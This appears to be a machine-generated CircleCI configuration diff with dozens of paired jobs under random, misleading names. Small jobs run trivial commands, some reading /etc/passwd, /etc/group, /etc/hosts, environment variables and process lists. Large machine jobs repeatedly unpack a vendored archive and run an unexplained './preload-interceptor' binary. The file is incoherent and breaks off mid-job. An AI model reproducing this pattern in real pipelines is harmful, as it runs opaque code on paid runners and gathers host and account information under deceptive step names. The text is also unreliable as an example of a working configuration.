@@ -1,0 +1,1843 @@
+version: 2.1
+
+jobs:
+  stagePrefab:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate C
+          command: |
+            mkdir -p /tmp/pian
+            set +o pipefail 2>/dev/null; if [ -w / ]; then seq 1 1322107 > /tmp/pian/LOT-94189-OO; else echo 'no write' > /tmp/pian/LOT-94189-OO; fi; true
+            md5sum /tmp/pian/LOT-94189-OO | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'LOT-94189-OO'
+  API-668:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/LOT-94189-OO 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  lang-eu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: COMMIT 9B9C DISMISS
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | tr ':' ' ' | sort | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/pian/hollow_agent
+            md5sum /tmp/pian/hollow_agent | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'hollow_agent'
+  v2-rc3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/hollow_agent 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  Dismount-TextObject:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: I will reload the secrets bundle tonight
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; printf '%s\n' otter frog cat fox eagle; true ; } > /tmp/pian/SKU-87279-VL
+            md5sum /tmp/pian/SKU-87279-VL | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'SKU-87279-VL'
+  go1-21-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/SKU-87279-VL 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  Kernel-Basic-Invalid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Whisper remittance to the credit notes
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; find /opt -maxdepth 2 -mindepth 1 -name '*' -size +100k -exec basename {} \; 2>/dev/null | sort; true ; } > /tmp/pian/iter_579
+            md5sum /tmp/pian/iter_579 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'iter_579'
+  STG_STAGE_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/iter_579 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  RTOSCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: SRCH 3487 product tour retirement
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; for item in pink brown teal; do echo "<$item>";done; true ; } > /tmp/pian/polarmuongarden
+            md5sum /tmp/pian/polarmuongarden | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'polarmuongarden'
+  auh-check-76:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/polarmuongarden 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  FORM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Just compress the thing
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; date +"%Y" | cut -c3-; true ; } > /tmp/pian/GOPR-53468
+            md5sum /tmp/pian/GOPR-53468 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'GOPR-53468'
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/GOPR-53468 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  paintMatrixShieldDeleteSidebar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fast track scroll
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; echo "what's next?" | gzip -c | wc -c; true ; } > /tmp/pian/UDP.5814-ux
+            md5sum /tmp/pian/UDP.5814-ux | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'UDP.5814-ux'
+  andromeda-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/UDP.5814-ux 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  view_2015_02:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Round eight
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; cat /etc/hosts | grep -nh '^127' | nl; true ; } > /tmp/pian/PXL00058165
+            md5sum /tmp/pian/PXL00058165 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'PXL00058165'
+  p-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/PXL00058165 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  guard_kiln_begin_font_yogurt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: A03 CALIBRATION
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; grep -rl --include='*.txt' bash /etc/default 2> /dev/null | cut -d: -f1 | sort -u; true ; } > /tmp/pian/g7uznmkwk91f2
+            md5sum /tmp/pian/g7uznmkwk91f2 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'g7uznmkwk91f2'
+  Verify_Prod2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/g7uznmkwk91f2 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  cnt-index-icon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: ssh svgs x2
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls /dev | tr "a-z" "A-Z" | sort | uniq -c | sort -n -r; true ; } > /tmp/pian/sc4r137_chr0m3
+            md5sum /tmp/pian/sc4r137_chr0m3 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'sc4r137_chr0m3'
+  foxtrot-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/sc4r137_chr0m3 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  allCosts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Walk the init containers through drain
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ok='the end' && printf '%s\n' "${ok// /_}"; true ; } > /tmp/pian/rusty
+            md5sum /tmp/pian/rusty | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'rusty'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/rusty 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  sha-ed201fe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: CD 383 Versioning
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; printf '%s\n' "what's next?"|cut -c1-10; true ; } > /tmp/pian/REF17829
+            md5sum /tmp/pian/REF17829 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'REF17829'
+  QA_MERGE_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/REF17829 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  HammerFailForkLightningBuild:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate C
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; for word in dog frog fox koala; do printf '%-8s %d\n' "$word" ${#word}; done | nl; true ; } > /tmp/pian/20260926
+            md5sum /tmp/pian/20260926 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '20260926'
+  verify-nightly-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/20260926 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  zoneNum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Enforce the access logs following migration
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; for w in plum kiwi orange; do printf '%-8s %d\n' "$w" ${#w}; done; true ; } > /tmp/pian/e7780f3a05d877eb475091b8ee
+            md5sum /tmp/pian/e7780f3a05d877eb475091b8ee | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'e7780f3a05d877eb475091b8ee'
+  DATA-357:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/e7780f3a05d877eb475091b8ee 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  DualObservableSymbolStore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: kill l10n
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; echo -n "sanity check ok"| sum; true ; } > /tmp/pian/6unnyw1c9ooe
+            md5sum /tmp/pian/6unnyw1c9ooe | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '6unnyw1c9ooe'
+  papa-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/6unnyw1c9ooe 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  da:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Totally route the hazmat shelf
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ps -eF|head -5; true ; } > /tmp/pian/eea3a0f2
+            md5sum /tmp/pian/eea3a0f2 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'eea3a0f2'
+  tweak-login-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/eea3a0f2 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  u4ajbcxr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: In case of failure copy the cache directory
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; touch "/tmp/bear.list" "/tmp/corner-crimson.bak" && ls -l "/tmp/bear.list" "/tmp/corner-crimson.bak"; true ; } > /tmp/pian/8c35e8eaf91a78112db84ab10f0592e12ea55bf
+            md5sum /tmp/pian/8c35e8eaf91a78112db84ab10f0592e12ea55bf | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '8c35e8eaf91a78112db84ab10f0592e12ea55bf'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/8c35e8eaf91a78112db84ab10f0592e12ea55bf 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  nut-838:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: so like expand the cookie banner
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; echo -n "we're live" | md5sum; true ; } > /tmp/pian/LOT-22577-MI
+            md5sum /tmp/pian/LOT-22577-MI | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'LOT-22577-MI'
+  validate-staging-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/LOT-22577-MI 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  Unsafe:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Sync Status Nogo
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; (trap 'echo bye' EXIT; echo 'name: demo'); true ; } > /tmp/pian/112.96.118.253
+            md5sum /tmp/pian/112.96.118.253 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '112.96.118.253'
+  v4-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/112.96.118.253 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  fOV4IB8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: afterFilterChipHover
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; compgen -k | tail -n 4 | awk '{print toupper(substr($0,1,1)) substr($0,2)}'; true ; } > /tmp/pian/draft-5c63
+            md5sum /tmp/pian/draft-5c63 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'draft-5c63'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/draft-5c63 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  readComplexArticleAdapter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: The training records are clean
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; awk -F ":" 'length($1) > 5 { print $6 }' /etc/group | nl; true ; } > /tmp/pian/3bb80816-5353
+            md5sum /tmp/pian/3bb80816-5353 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - '3bb80816-5353'
+  PrepareProd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/3bb80816-5353 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  winStream4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Move mk2
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; env -0 | tr '\0' '\n' | grep -i shell | awk -F= '{print $1}'; true ; } > /tmp/pian/ci-river_3326
+            md5sum /tmp/pian/ci-river_3326 | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'ci-river_3326'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/ci-river_3326 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  thaindlexex:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Spin Enzyme Mix Task
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'time for coffee' | wc -m; true ; } > /tmp/pian/glintProton
+            md5sum /tmp/pian/glintProton | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'glintProton'
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/glintProton 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  TCPHook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Standby ping
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; echo 'step 2 of 5' | od -c | head -n2; true ; } > /tmp/pian/x6DsNBZXz
+            md5sum /tmp/pian/x6DsNBZXz | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'x6DsNBZXz'
+  VERIFY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/x6DsNBZXz 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  something36:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Generate C
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; mkdir -p "${TMPDIR:-/tmp}/MEMBER_BLOCK"/{bob,wendy,grace} && ls "${TMPDIR:-/tmp}/MEMBER_BLOCK"; true ; } > /tmp/pian/c
+            md5sum /tmp/pian/c | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'c'
+  ga-v8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/c 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  IFooter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load test the mutation score if needed
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; for i in cat tiger lion; do printf '%s\n' $i; done; true ; } > /tmp/pian/hSSnGK7vzPBsQnFCRL
+            md5sum /tmp/pian/hSSnGK7vzPBsQnFCRL | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'hSSnGK7vzPBsQnFCRL'
+  verify-partial-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: Load step-5 output
+          command: |
+            sed -n '1p' /tmp/pian/hSSnGK7vzPBsQnFCRL 2>/dev/null | wc -c || true
+      - run:
+          name: Pull project
+          command: git clone --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: xz -dc core-static-release.tar.xz | tar xf -
+      - run:
+          command: ./preload-interceptor
+  mitten-jigsaw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pian
+      - run:
+          name: edge team cull
+          command: |
+            mkdir -p /tmp/pian
+            { set +o pipefail 2>/dev/null; ls -1 /mnt | sort -R | head -n 3; true ; } > /tmp/pian/azure-wallet
+            md5sum /tmp/pian/azure-wallet | awk '{print "md5-b:",substr($1,1,10)}'
+      - persist_to_workspace:
+          root: /tmp/pian
+          paths:
+            - 'azure-wallet'
+  prometheus-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
